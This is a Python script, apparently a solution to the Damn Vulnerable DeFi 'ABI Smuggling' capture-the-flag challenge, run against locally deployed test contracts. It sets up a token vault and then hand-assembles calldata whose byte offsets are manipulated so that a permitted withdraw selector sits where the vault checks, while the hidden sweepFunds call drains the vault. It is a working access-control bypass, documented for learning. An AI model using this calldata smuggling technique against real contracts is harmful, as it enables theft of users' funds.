from ape import accounts, project
from ..utils.helper import send_tx, w3, reverts
import eth_abi

VAULT_TOKEN_BALANCE = w3.to_wei(1000000, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]
    recovery = accounts.test_accounts[2]

    print(f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}")
    print(f"⇒ Recovery: {recovery}\n---\n")

    # Deploy Damn Valuable Token contract
    print("\n--- Deploying Token ---\n")
    token = project.DamnValuableToken.deploy(sender=deployer)

    # Deploy Vault
    print("\n--- Deploying Vault ---\n")
    vault = project.SelfAuthorizedVault.deploy(sender=deployer)
    assert vault.getLastWithdrawalTimestamp() != 0

    # Set permissions
    print("\n--- Setting Vault Permissions ---\n")
    deployer_permission = vault.getActionId(bytes.fromhex("85fb709d"), deployer, vault)
    attacker_permission = vault.getActionId(bytes.fromhex("d9caed12"), attacker, vault)
    vault.setPermissions(
        [deployer_permission, attacker_permission],
        sender=deployer,
    )
    assert vault.permissions(deployer_permission)
    assert vault.permissions(attacker_permission)

    # Make sure vault is initialized
    print("\n--- Making sure vault is initialized ---\n")
    assert vault.initialized()

    # Deposit tokens into vault
    print("\n--- Depositing tokens into vault ---\n")
    token.transfer(vault, VAULT_TOKEN_BALANCE, sender=deployer)

    assert token.balanceOf(vault) == VAULT_TOKEN_BALANCE
    assert token.balanceOf(attacker) == 0

    # Cannot vall vault directly
    print("\n--- Ensuring you can not call the vault directly ---\n")
    with reverts():
        vault.sweepFunds(deployer, token, sender=deployer)
    with reverts():
        vault.withdraw(
            token,
            attacker,
            w3.to_wei(1, "ether"),
            sender=attacker,
        )

    # define initial balances for vault and recovery
    vault_initial_bal = token.balanceOf(vault) / 10**18
    recovery_initial_bal = token.balanceOf(recovery) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Vault: {vault_initial_bal}\n⇒ Recovery: {recovery_initial_bal}"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    # check out the article below for a more in depth explanation
    # https://medium.com/@mattaereal/damnvulnerabledefi-abi-smuggling-challenge-walkthrough-plus-infographic-7098855d49a
    # We are going to build our own calldata and this is the format:
    # MethodID: 0x1cff79cd => function selector
    # [0]:  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 => first param: address (target)
    # [1]:  0000000000000000000000000000000000000000000000000000000000000064 => byte offset for second param (modified)
    # [2]:  0000000000000000000000000000000000000000000000000000000000000000 => empty bytes32 for hardcoded offset
    # [3]:  d9caed12                                                         => `withdraw(address,address,uint256)` function selector
    # [4]:  0000000000000000000000000000000000000000000000000000000000000044 => length of bytes (second param)
    # [5]:  85fb709d000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d62 => second param: `sweepFunds` selector + part of attacker address
    # [5]:  8176a1e7000000000000000000000000274b028b03a250ca03644e6c578d81f0 => second param: rest of attacker address + part of token address
    # [5]:  19ee132300000000000000000000000000000000000000000000000000000000 => second param: rest of token address

    function_selector = w3.keccak(text="execute(address,bytes)")[:4]

    param_one = eth_abi.encode(["address"], [vault.address])

    param_two = int(100).to_bytes(32, byteorder="big")

    param_three = int(0).to_bytes(32, byteorder="big")

    param_four = w3.keccak(text="withdraw(address,address,uint256)")[:4]

    param_five = int(68).to_bytes(32, byteorder="big")

    param_six = w3.keccak(text="sweepFunds(address,address)")[:4] + eth_abi.encode(
        ["address", "address"], [recovery.address, token.address]
    )
    malicious_calldata = (
        function_selector
        + param_one
        + param_two
        + param_three
        + param_four
        + param_five
        + param_six
    )
    send_tx(attacker, vault.address, malicious_calldata)

    # --- AFTER EXPLOIT --- #
    print(
        "\n--- After exploit: Attacker should have recovered all tokens from the vault  ---\n"
    )

    # define ending balances for vault and recovery
    vault_ending_bal = token.balanceOf(vault) / 10**18
    recovery_ending_bal = token.balanceOf(recovery) / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Vault: {vault_ending_bal}\n⇒ Recovery: {recovery_ending_bal}\n---\n"
    )

    assert token.balanceOf(vault) == 0
    assert token.balanceOf(attacker) == 0
    assert token.balanceOf(recovery) == VAULT_TOKEN_BALANCE

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
